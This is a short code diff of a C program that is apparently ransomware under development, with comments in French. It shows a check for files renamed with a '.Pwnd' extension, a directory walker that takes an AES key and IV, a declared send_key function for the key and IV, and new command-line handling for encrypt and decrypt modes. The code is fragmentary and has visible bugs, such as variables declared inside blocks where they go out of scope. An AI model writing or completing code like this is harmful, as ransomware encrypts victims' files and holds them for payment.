@@ -9,7 +9,7 @@ void usage();
 
 int is_encrypted(char *filename)
 {
-	char * ext = strrchr(filename, '.');
+	char *ext = strrchr(filename, '.');
 
 	if (strcmp(ext, ".Pwnd") == 0)
 	{
@@ -25,7 +25,7 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 
 	if (!dir)
 	{
-		printf("%s\n", "Unable to open directory.");
+		printf("Unable to open directory \"%s\".\n", name);
 		return;
 	}
 
@@ -72,11 +72,39 @@ int send_key(char *pKey, char *pIv);
 
 int main(int argc, char *argv[])
 {
+	// Arguments: ransom [-d|-e] <key> <iv> chemin
+	if (strcmp(argv[1], "-e") == 0)
+	{ // Si -e -> chemin
+		if (argc != 3)
+		{
+			printf("You need to specify 2 arguments when using the -e argument.");
+			return 0;
+		}
+
+		char de_flag = 'e';
+		char *path = argv[2];
+	}
+	else if (strcmp(argv[1], "-d") == 0)
+	{ // Si -d -> key, iv et chemin
+		if (argc != 5)
+		{
+			printf("You need to specify 4 arguments when using the -d argument.");
+			return 0;
+		}
+
+		char de_flag = 'd';
+		char *key = argv[2];
+		char *iv = argv[3];
+		char *path = argv[4];
+	}
+	else
+	{ // Si ni -e ni -d -> Erreur
+		printf("You must specify -d or -e.");
+	}
+
 	// Variables relatives à la clé et au vecteur
 	unsigned char key[AES_256_KEY_SIZE];
 	unsigned char iv[AES_BLOCK_SIZE];
 	char pKey[AES_256_KEY_SIZE / 2];
 	char pIv[AES_BLOCK_SIZE / 2];
-
-	printf("%d\n", is_encrypted("test.txt"));
 }
